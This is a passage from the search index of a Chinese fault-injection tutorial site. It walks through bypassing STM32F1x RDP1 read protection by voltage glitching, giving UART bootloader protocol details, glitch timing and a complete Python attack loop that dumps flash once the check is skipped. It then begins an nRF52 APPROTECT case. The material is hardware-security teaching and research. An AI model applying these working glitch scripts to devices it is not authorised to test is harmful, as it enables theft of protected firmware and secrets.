\u5f15\u811a\u7684\u7535\u5e73\u72b6\u6001\uff0c\u5171\u6709\u4e09\u79cd\u542f\u52a8\u6a21\u5f0f\uff0c\u6839\u636e STM32 Datasheet(P15) System meoery \u4e2d\u5b58\u653e\u7684\u662f bootloader\uff0c\u8fd9\u90e8\u5206\u662f\u82af\u7247\u5728\u5236\u9020\u9636\u6bb5\u70e7\u8fdb\u53bb\u7684\uff0c\u662f\u4e00\u6bb5\u53ea\u8bfb\uff08\u4e0d\u53ef\u66f4\u6539\uff09\u7684\u4ee3\u7801</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u4e3b\u8981\u4f5c\u7528\u4e3a\u901a\u8fc7\u4e32\u53e3\u5bf9 STM32 \u7684 Flash \u8fdb\u884c\u64e6\u9664\u548c\u5199\u5165\u3002\u5373\u53ef\u4ee5\u5728\u677f\u7ea7\u4e0a\u8fdb\u884c\u7f16\u7a0b\uff0c\u800c\u4e0d\u7528\u628a\u82af\u7247\u62c6\u4e0b\u6765\u653e\u5230\u70e7\u5199\u5668\u4e2d\uff0c\u6240\u4ee5\u79f0\u4f5c\u201c\u5728\u7cfb\u7edf\u7f16\u7a0b\u201d ISP\uff08In-System Programming\uff09\u8981\u4f7f\u7528 UART Bootloader \u529f\u80fd\u8981\u5207\u6362\u5230 System memory \u542f\u52a8\uff0c\u5373 BOOT0 \u8981\u8bbe\u7f6e\u4e3a 1\uff0cBOOT1 \u8981\u8bbe\u7f6e\u4e3a 0</p> <p>\u56e0\u6b64\u5c06 BOOT0 \u8df3\u7ebf\u5e3d\u63a5\u5230 1\uff1bBOOT1 \u8df3\u7ebf\u5e3d\u63a5\u5230 0 \u5207\u6362\u5230 Bootloader \u542f\u52a8</p> <p></p> <p>\u6309\u7167\u5982\u4e0b\u7ebf\u5e8f\u5c06 STM32 \u4e0e\u4e32\u53e3\u5c0f\u677f\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5c06\u4e32\u53e3\u5c0f\u677f\u63d2\u5230\u7535\u8111 USB \u63a5\u53e3\uff0c\u6253\u5f00 CubeProgrammer \u9009\u62e9 UART \u8fdb\u884c\u8fde\u63a5\uff08\u5982\u679c\u672a\u5f00\u542f RDP\uff0c\u5e94\u8be5\u8bfb\u51fa\u4e86 Flash \u6570\u636e\uff09</p> STM32 USB TO TTL 3V3 3V3 GND GND A9 RXD A10 TXD <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#uart-bootloader","title":"Uart Bootloader \u901a\u4fe1\u534f\u8bae","text":"<p>ST \u5bf9\u4e8e UART Bootloader \u7684\u901a\u4fe1\u534f\u8bae\u6709\u4e00\u4efd\u8be6\u7ec6\u7684\u6587\u6863\uff0c\u8fd9\u5c06\u6210\u4e3a\u6211\u4eec\u7a81\u7834 RDP \u7684\u5173\u952e\uff1aprotocol in stm32 bootloader</p> <p></p> <p>\u901a\u8fc7\u63a2\u7d22\u8be5\u6587\u6863\uff0c\u53d1\u73b0 0x11 \u8fd9\u6761\u547d\u4ee4\u662f\u7528\u6765\u901a\u8fc7 Uart Bootloader \u8bfb\u53d6\u5185\u5b58\u7684\uff0c\u6839\u636e\u624b\u518c P15 \u548c P16 \u4e2d\u7684\u63cf\u8ff0\uff0c\u6d41\u7a0b\u4e3a\uff1a</p> <p>1\u3001\u53d1\u9001 0x11 \u53ca\u5176\u53cd\u7801\u6821\u9a8c 0xEE</p> <p>2\u3001\u6536\u5230 ACK \u518d\u53d1\u9001\u8981\u8bfb\u53d6\u7684\u5730\u5740\uff0c\u8be5\u5730\u5740\u683c\u5f0f\u4e3a\u56db\u4e2a\u5b57\u8282\u7684\u5927\u7aef\u5e8f\uff0c\u4e14\u4e92\u76f8\u5f02\u6216\u5f97\u51fa\u4e00\u4e2a\u5b57\u8282\u7684\u6821\u9a8c\u548c</p> <p>3\u3001\u6536\u5230 ACK \u540e\u53d1\u9001 Size \u53ca\u5176\u53cd\u7801\u6821\u9a8c\u548c\uff0cSize\u4e3a\u5b9e\u9645\u8981\u8bfb\u7684\u5927\u5c0f\u51cf\u4e00</p> <p>4\u3001\u6536\u5230 ACK \u540e\uff0c\u63a5\u6536\u8bfb\u56de\u6765\u7684\u6570\u636e</p> <p>\u6bcf\u6b21\u8bfb\u53d6\u6700\u591a 256 \u4e2a\u5b57\u8282\u6570\u636e\uff0c\u4f46\u662f\u53ef\u4ee5\u5199\u4e2a\u5faa\u73af\u591a\u6b21\u8bfb\u53d6</p> <p></p> <p>\u56e0\u6b64\u7f16\u5199\u811a\u672c\u5c1d\u8bd5\u901a\u8fc7 Uart Bootloader \u8bfb\u53d6 flash \u4e2d\u7684\u5185\u5bb9\uff1a</p> <pre><code>import serial # \u5bfc\u5165\u4e32\u53e3\u5e93\nimport struct\n\n# \u521d\u59cb\u5316\u4e32\u53e3\uff0c\u6821\u9a8c\u683c\u5f0f\u4e3a\u5076\u6821\u9a8c\ns = serial.Serial(\"COM52\",115200,parity=serial.PARITY_EVEN,timeout=0.5)\n\ns.write(b\"\\x7F\") # \u53d1\u9001 0x7F\nrecv = s.read(1)\nprint(\"0x7F ack: \",recv.hex())\n\ns.write(b\"\\x11\\xEE\") # \u53d1\u9001 0x11 read memory\nrecv = s.read(1)\nprint(\"0x11 ack: \",recv.hex())\n\naddr = 0x08000000\na = struct.pack('&gt;I',addr) # \u5927\u7aef\u5e8f\nx = struct.pack('B',(a[0] ^ a[1] ^ a[2] ^ a[3])) # \u8ba1\u7b97\u6821\u9a8c\u548c\naddress = a + x\n\ns.write(address) # \u53d1\u9001 address\nrecv = s.read(1)\nprint(\"address ack: \",recv.hex())\n\ns.write(b\"\\xFF\\x00\") # \u53d1\u9001 size 0xFF\nrecv = s.read(1)\nprint(\"size ack: \",recv.hex())\n\nflash = s.readall()\nprint(\"Read back Flash: \",flash.hex())\n</code></pre> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#uart-bootloader_1","title":"\u6545\u969c Uart Bootloader","text":"<p>\u4f46\u5f53\u5f00\u542f RDP \u540e\u4ecd\u7136\u65e0\u6cd5\u901a\u8fc7\u8be5\u65b9\u6cd5\u8bfb\u53d6\u56fa\u4ef6\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u5f00\u542f RDP1 \u540e Bootloader \u5e76\u4e0d\u662f\u5b8c\u5168\u62d2\u7edd\u54cd\u5e94\u7684\uff0c\u5f53\u6211\u4eec\u4f7f\u7528 0x7F \u6fc0\u6d3b bootloader \u65f6\u4ecd\u7136\u56de\u590d\u4e86 0x79\uff0c\u7b49\u5230 0x11 \u8bf7\u6c42\u8bfb\u53d6 Flash \u65f6\u624d\u4f1a\u8fd4\u56de 0x1F \u90a3\u662f\u4e0d\u662f\u6709\u53ef\u80fd\u610f\u5473\u7740\uff1a\u6bcf\u6b21\u53d1\u9001 0x11 \u65f6 Bootloader \u90fd\u4f1a\u5148\u68c0\u67e5 RDP1 \u662f\u5426\u5f00\u542f\uff0c\u518d\u51b3\u5b9a\u662f\u5426\u53ef\u4ee5\u6267\u884c\u8bfb\u53d6 Flash \u7684\u64cd\u4f5c\u5462\uff1f</p> <p>\u4f7f\u7528\u793a\u6ce2\u5668\u6293\u53d6\u8bfb\u53d6 Flash \u7684 UART \u901a\u4fe1\u8fc7\u7a0b\uff0c\u5e76\u6dfb\u52a0\u4e32\u884c\u8bd1\u7801\u89e3\u6790 UART \u901a\u4fe1\uff0c\u9009\u62e9\u5076\u6821\u9a8c</p> <p></p> <p>\u56fe\u4e2d\u7ea2\u8272\u6ce2\u5f62\u4e3a PA10\uff1b\u84dd\u8272\u6ce2\u5f62\u4e3a PA9\uff0c\u901a\u8fc7\u793a\u6ce2\u5668\u6ce2\u5f62\u56fe\u4e2d\u7684\u865a\u7ebf\u6807\u5c3a\u53ef\u4ee5\u770b\u5230\uff0c\u53d1\u9001\u5b8c \\x11\\xEE \u5927\u7ea6 14.44us \u8fd4\u56de\u4e86 \\x1F\uff0c\u5982\u679c\u771f\u5982\u6211\u4eec\u6240\u60f3\uff0c\u90a3\u4e48\u6821\u9a8c\u903b\u8f91\u4e00\u5b9a\u5728\u8fd9\u671f\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u671f\u95f4\u8fdb\u884c\u6545\u969c\u6ce8\u5165\uff0c\u6839\u636e UART \u534f\u8bae\uff0cread memory \u547d\u4ee4\u4f1a\u4ea7\u751f 6 \u6b21\u4e0a\u5347\u6cbf\uff0c\u53ea\u8981\u5728 PA10 \u53d1\u9001 \\x11\\xEE \u9020\u6210\u7684\u7b2c\u516d\u6b21\u4e0a\u5347\u6cbf\u540e\u7684 14.44us \u5185\u6ce8\u5165\u6545\u969c\u5c31\u6709\u53ef\u80fd\u7ed5\u8fc7 RDP \u7684\u68c0\u67e5</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#stm32f1x-rdp1","title":"\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7STM32F1x RDP1","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_4","title":"\u7535\u538b\u6bdb\u523a\u6ce8\u5165\u7269\u7406\u4f4d\u7f6e","text":"<p>\u67e5\u9605 STM32F103 \u7684\u82af\u7247\u624b\u518c\uff0cF103\u82af\u7247\u6709\u591a\u4e2a\u4f9b\u7535\u5f15\u811a\uff0c\u8fd9\u4e9b\u76f4\u63a5\u63a5\u5230\u4e86\u5f00\u53d1\u677f\u7684 3.3V \u4e0a\uff0c\u56e0\u6b64\u6211\u4eec\u76f4\u63a5\u5bf9\u5f00\u53d1\u677f\u7684\u4f9b\u7535\u5f15\u811a\u8fdb\u884c\u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_5","title":"\u53bb\u7535\u5bb9\u63d0\u9ad8\u6210\u529f\u7387","text":"<p>\u5f00\u53d1\u677f\u4e0a\u7684\u7535\u5bb9\u5177\u6709\u50a8\u80fd\u7684\u7279\u6027\uff0c\u5982\u679c\u5728\u4e00\u4e2a\u5177\u6709\u5de8\u5927\u7535\u5bb9\u7684\u7535\u6e90\u7ebf\u4e0a\u8fdb\u884c\u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165\uff0c\u7535\u538b\u4f1a\u7f13\u6162\u4e0b\u964d\u5230\u96f6\uff0c\u8fbe\u4e0d\u5230\u6211\u4eec\u671f\u671b\u7684\u6548\u679c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u628a\u7535\u5bb9\u53bb\u9664\uff08\u8fd9\u91cc\u4ec5\u4ee5\u67d0\u578b\u53f7 STM32F103 \u5f00\u53d1\u677f\u4e3a\u4f8b\uff0c\u5177\u4f53\u9700\u6839\u636e\u5356\u5bb6\u7ed9\u7684\u539f\u7406\u56fe\u81ea\u5df1\u67e5\u627e\uff09</p> <p></p> <p>\u6211\u4eec\u7684 STM32F103 \u6838\u5fc3\u677f\u53ea\u662f\u4e2a\u5c0f\u5f00\u53d1\u677f\uff0c\u4e0d\u662f\u4ec0\u4e48\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u6240\u4ee5\u53ef\u4ee5\u653e\u5fc3\u7684\u591a\u53bb\u51e0\u4e2a\u7535\u5bb9\u8bd5\u8bd5</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_6","title":"\u6545\u969c\u6ce8\u5165\u65f6\u9047\u5230\u7684\u95ee\u9898","text":"<p>1\u3001\u5982\u4f55\u63a7\u5236\u8bbe\u5907\u91cd\u542f\uff08\u91cd\u542f\uff09</p> <p>\u200b   \u7b54\uff1a\u901a\u8fc7 PowerShorter \u8bbe\u5907\u7684 GPIO \u4e3a STM32 \u4f9b\u7535\uff0cPython \u4ee3\u7801\u63a7\u5236 GPIO</p> <p>2\u3001\u6253\u54ea\u4e2a\u5730\u65b9\u7684\u7535\u538b\u3001\u5982\u4f55\u6253\uff08\u6bdb\u523a\u7269\u7406\u4f4d\u7f6e\u3001CPU \u6838\u5fc3\u4f9b\u7535\u3001\u77ed\u8def\u6bdb\u523a\u3001\u6bdb\u523a\u5bbd\u5ea6\uff09</p> <p>\u200b   \u7b54\uff1a\u76f4\u63a5\u6253 VDD \u4f9b\u7535\u5f15\u811a\uff1b\u77ed\u63a5 VDD \u548c GND \u4f7f\u5176\u7535\u538b\u77ed\u6682\u62c9\u4f4e</p> <p>3\u3001\u4ec0\u4e48\u65f6\u5019\u6253\u6545\u969c\uff08\u6bdb\u523a\u65f6\u95f4\u4f4d\u7f6e\u3001\u89e6\u53d1\u3001\u5ef6\u65f6\uff09</p> <p>\u200b   \u7b54\uff1a\u4ee5 \\x11\\xEE \u53d1\u9001\u65f6\u5728 A10 \u4e0a\u4ea7\u751f\u7684\u7b2c 6 \u4e2a\u4e0a\u5347\u6cbf\u4f5c\u4e3a\u89e6\u53d1\uff0c\u6253\u5728\u4e0a\u5347\u6cbf14.44us \u5185</p> <p>4\u3001\u600e\u4e48\u5224\u65ad\u662f\u5426\u6253\u6210\u529f\u4e86\uff08\u6545\u969c\u7ed3\u679c\u53cd\u9988\uff09</p> <p>\u200b   \u7b54\uff1a\u5224\u65ad \\x11\\xEE \u8fd4\u56de\u7684\u7ed3\u679c\uff0c\u4e3a \\x79 \u5219\u8868\u793a\u6545\u969c\u6210\u529f</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_7","title":"\u786c\u4ef6\u63a5\u7ebf\u53c2\u8003","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_8","title":"\u6210\u529f\u6ce2\u5f62\u53c2\u8003","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_9","title":"\u653b\u51fb\u811a\u672c\u53c2\u8003","text":"<p>\u5bfc\u5165\u76f8\u5173\u5e93</p> <pre><code>from power_shorter import *\nimport time\nimport serial\nimport faultviz\nimport random\n</code></pre> <p>\u521d\u59cb\u5316\u8bbe\u5907</p> <pre><code>ps_dev = PowerShorter(\"com86\")\n</code></pre> <p>\u7ed9\u8bbe\u5907\u4e0a\u4e0b\u7535\uff0c\u68c0\u67e5\u662f\u5426\u80fd\u591f\u6b63\u5e38\u91cd\u542f</p> <pre><code>ps_dev.gpio(GPIO.GPIO1, 0)\ntime.sleep(1)\nps_dev.gpio(GPIO.GPIO1, 1)\n</code></pre> <p>\u521d\u59cb\u5316 faultviz \u670d\u52a1\u4e0e\u8868\u5355</p> <pre><code>faultviz.start_view_service(port=12345) \nvt = faultviz.ViewWidget()\n</code></pre> <p>\u5b9a\u4e49 Uart Bootloader \u4e2d\u5730\u5740\u683c\u5f0f\u8f6c\u5316\u51fd\u6570</p> <pre><code>def gen_addr(addr_int):\n    addr_checksum = 0\n    addr_bytes = addr_int.to_bytes(4,byteorder=\"big\")\n    for i in addr_bytes:\n        addr_checksum ^= i\n    return addr_bytes + addr_checksum.to_bytes(1,byteorder=\"big\")\n</code></pre> <p>\u521d\u59cb\u5316\u4e32\u53e3\u5c0f\u677f</p> <pre><code>s = serial.Serial('com50', 115200, parity=serial.PARITY_EVEN, timeout=0.5)\n</code></pre> <p>\u5b9a\u4e49\u653b\u51fb\u51fd\u6570</p> <pre><code>def stm32_attack():\n    ps_dev.gpio(GPIO.GPIO1, 0)\n    time.sleep(0.3)\n    ps_dev.gpio(GPIO.GPIO1, 1)\n    glitch_delay = random.randint(990, 1050)\n    glitch_pulse = random.randint(15, 30)\n\n    ps_dev.engine_cfg(Engine.E1, [(0, glitch_delay), (1, glitch_pulse), (0, 1)], TRIGGER_MODE.RISE,1 ,6)    # \u8bbe\u7f6e\u6bdb\u523a\u4e0a\u5347\u6cbf\u516d\u6b21\u89e6\u53d1\n    s.write(b'\\x7f')\n    res1 = s.readall().hex()\n\n    ps_dev.arm(Engine.E1)        # \u53d1\u9001 0x11 0xEE \u524d\u6fc0\u6d3b\u6bdb\u523a\n    s.write(b'\\x11\\xee')\n    res2 = s.read(1).hex()\n    if res2 == '79':             # \u82e5\u8fd4\u56de 79 \u5219\u8868\u793a\u6210\u529f\u7ed5\u8fc7 RDP\n        status = \"Success\"\n        s.write(gen_addr(0x08000000))   # \u53d1\u9001\u8981\u8bfb\u53d6\u7684\u5730\u5740\n        res3 = s.read(1).hex()\n        s.write(b'\\xff\\x00')            # \u53d1\u9001\u8981\u8bfb\u53d6\u7684 size\n        res4 = s.read(257).hex()        # \u63a5\u6536\u8bfb\u53d6\u7684\u6570\u636e\n        result = res1+res2+res3+res4\n        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = str(result))\n        return 0\n\n    else:\n        status = \"Normal\"\n        result = res1 + res2  \n        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = str(result))\n        return 1\n</code></pre> <p>\u6267\u884c\u4e00\u6b21\u653b\u51fb\u51fd\u6570\uff0c\u68c0\u67e5\u4ee3\u7801\u662f\u5426\u6709\u95ee\u9898</p> <pre><code>stm32_attack()\n</code></pre> <p>\u67e5\u770b\u8868\u5355\uff0c\u68c0\u67e5\u521a\u624d\u7684\u653b\u51fb\u662f\u5426\u5c06\u7ed3\u679c\u6dfb\u52a0\u5230\u8868\u5355\u4e2d</p> <pre><code>vt.show()\n</code></pre> <p>\u5199\u4e2a\u5faa\u73af\uff0c\u76f4\u5230\u6210\u529f\u7ed5\u8fc7 RDP \u624d\u505c\u6b62\u653b\u51fb\uff0c\u5faa\u73af\u8fc7\u7a0b\u4e2d\u6545\u969c\u53c2\u6570\u53ca\u7ed3\u679c\u4f1a\u4e0d\u65ad\u6dfb\u52a0\u5230 vt \u8868\u5355\u4e2d\uff0c\u914d\u5408\u793a\u6ce2\u5668\u8c03\u6574\u53c2\u6570\uff0c\u4f18\u5316\u6bdb\u523a\u4f4d\u7f6e</p> <pre><code>attackflag = 1\nwhile(attackflag):\n    attackflag = stm32_attack()\n</code></pre>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/","title":"nRF52 \u7535\u538b\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7 APPROTECT \u56fa\u4ef6\u8bfb\u4fdd\u62a4","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_1","title":"\u76f8\u5173\u5de5\u5177\u53ca\u73af\u5883","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_2","title":"\u63a8\u8350\u786c\u4ef6\u8bbe\u5907\u6e05\u5355","text":"<ul> <li>nRF52840 QIAAD0 \u5f00\u53d1\u677f\uff08USB Dongle\uff09</li> <li>Pico \u793a\u6ce2\u5668</li> <li>PowerShorter \u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165\u8bbe\u5907</li> <li>FlexHolder \u67d4\u6027\u63a2\u9488\u53f0</li> <li>Jlink \u8c03\u8bd5\u5668</li> <li>\u675c\u90a6\u7ebf\u82e5\u5e72</li> </ul>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_3","title":"\u8f6f\u4ef6\u6e05\u5355","text":"<ul> <li>Jlink \u8f6f\u4ef6\u53ca\u9a71\u52a8</li> <li>nRF-Command-Line-Tools</li> <li>openocd</li> <li>Pico \u793a\u6ce2\u5668\u8f6f\u4ef6</li> <li>zadig</li> </ul>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#approtect","title":"APPROTECT \u4ecb\u7ecd\u4e0e\u5f00\u542f","text":"<p>nRF52 \u7cfb\u5217\u82af\u7247\u4e3a\u4fdd\u62a4\u5f00\u53d1\u8005\u56fa\u4ef6\u4e0d\u88ab\u975e\u6cd5\u8bfb\u53d6\uff0c\u63d0\u4f9b\u4e86 APPRTOECT \u56fa\u4ef6\u8bfb\u4fdd\u62a4\u673a\u5236\uff0c\u5f00\u542f\u8bfb\u4fdd\u62a4\u540e\u65e0\u6cd5\u4f7f\u7528 SWD \u63a5\u53e3\u8bfb\u53d6\u82af\u7247\u5185\u7684\u56fa\u4ef6</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_4","title":"\u5f00\u542f\u4fdd\u62a4\u65b9\u6cd5","text":"<p>\u5148\u4f7f\u7528 Jlink \u8fde\u63a5 \u76ee\u6807 SWD \u63a5\u53e3</p> USB Dongle Jlink VDD VT/VREF GND GND SWCLK TCK/SWCLK SWDIO TMS/SWDIO <p></p> <p>\u4f7f\u7528\u5b98\u65b9\u547d\u4ee4\u884c\u5de5\u5177\uff08nRF-Command-Line-Tools\uff09\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u5bf9\u5f00\u53d1\u677f\u91cd\u65b0\u4e0a\u7535\u590d\u4f4d\u540e\u751f\u6548\uff1a</p> <pre><code>nrfjprog -f nRF52 --memwr 0x10001208 --val 0xFFFFFF00\n</code></pre> <p>\u518d\u6b21\u8fde\u63a5\u82af\u7247\u5df2\u65e0\u6cd5\u67e5\u770b Flash</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_5","title":"\u89e3\u9664\u4fdd\u62a4\u65b9\u6cd5","text":"<p>\u4e0d\u7ba1\u662f Jflash \u8fd8\u662f\u5b98\u65b9\u547d\u4ee4\u884c\u5de5\u5177\u90fd\u63d0\u4f9b\u89e3\u9664\u4fdd\u62a4\u7684\u529f\u80fd\uff08\u4ee3\u4ef7\u662f\u6e05\u9664\u82af\u7247\u5185\u56fa\u4ef6\uff0c\u4ee5\u8fbe\u5230\u4fdd\u62a4\u56fa\u4ef6\u4e0d\u88ab\u975e\u6cd5\u8bfb\u53d6\u7684\u76ee\u7684\uff09</p> <p>JFlash \u8f6f\u4ef6\u5728\u63a2\u6d4b\u5230\u4fdd\u62a4\u5f00\u542f\u65f6\u76f4\u63a5\u70b9\u51fb Yes \u5373\u53ef\u89e3\u9664\u4fdd\u62a4\uff0c\u6b64\u8fc7\u7a0b\u4f1a\u540c\u65f6\u6e05\u9664\u56fa\u4ef6</p> <p></p> <p>\u5b98\u65b9\u547d\u4ee4\u884c\u5de5\u5177\u63d0\u4f9b <code>nrfjprog -f NRF52 --recover</code> \u547d\u4ee4\u89e3\u9664\u4fdd\u62a4\uff0c\u6b64\u8fc7\u7a0b\u4f1a\u540c\u65f6\u6e05\u9664\u56fa\u4ef6</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#approtect_1","title":"APPROTECT \u4ecb\u7ecd","text":"<p>\u901a\u8fc7\u9605\u8bfb\u82af\u7247\u624b\u518c\u7b2c 42 \u9875\u53ef\u4ee5\u5f97\u77e5\uff1aAPPROTECT \u5bc4\u5b58\u5668\u4f4d\u4e8e 0x10001208 \u9ed8\u8ba4\u503c 0xFF \u8868\u793a\u5173\u95ed\u4fdd\u62a4\uff0c\u82e5\u5199\u4e3a 0x00 \u5219\u8868\u793a\u5f00\u542f\u4fdd\u62a4\uff0c\u56e0\u6b64\u5b98\u65b9\u5de5\u5177\u5f00\u542f\u4fdd\u62a4\u5b9e\u9645\u662f\u5c06\u8be5\u5bc4\u5b58\u5668\u5199\u4e3a\u4e86 0x00</p> <p>\u82af\u7247\u4e0a\u7535\u540e\u4f1a\u8bfb\u53d6\u8be5\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u82e5\u4e3a 0x00 \u5219\u914d\u7f6e\u4fdd\u62a4\u673a\u5236\uff0c\u4e0d\u5141\u8bb8\u901a\u8fc7 SWD \u63a5\u53e3\u8bbf\u95ee\u82af\u7247\u5185\u56fa\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u82af\u7247\u4e0a\u7535\u65f6\u5bf9\u5176\u8fdb\u884c\u6545\u969c\u6ce8\u5165\uff0c\u7ed5\u8fc7\u8be5\u914d\u7f6e\u6d41\u7a0b\uff0c\u4f7f\u5f97\u8c03\u8bd5\u63a5\u53e3\u4fdd\u6301\u5f00\u542f\u72b6\u6001</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#nrf52","title":"nRF52 \u82af\u7247\u7248\u672c\u786e\u8ba4","text":"<p>\u9274\u4e8e nRF52 \u65b0\u7248\u672c\u82af\u7247\u5df2\u7ecf\u5bf9\u6545\u969c\u6ce8\u5165\u6dfb\u52a0\u4e86\u7f13\u89e3\u63aa\u65bd\uff0c\u65e0\u6cd5\u7b80\u5355\u5730\u901a\u8fc7\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7\u8bfb\u4fdd\u62a4\u4e86\uff0c\u590d\u73b0\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u8001\u7248\u672c\u7684 nRF52 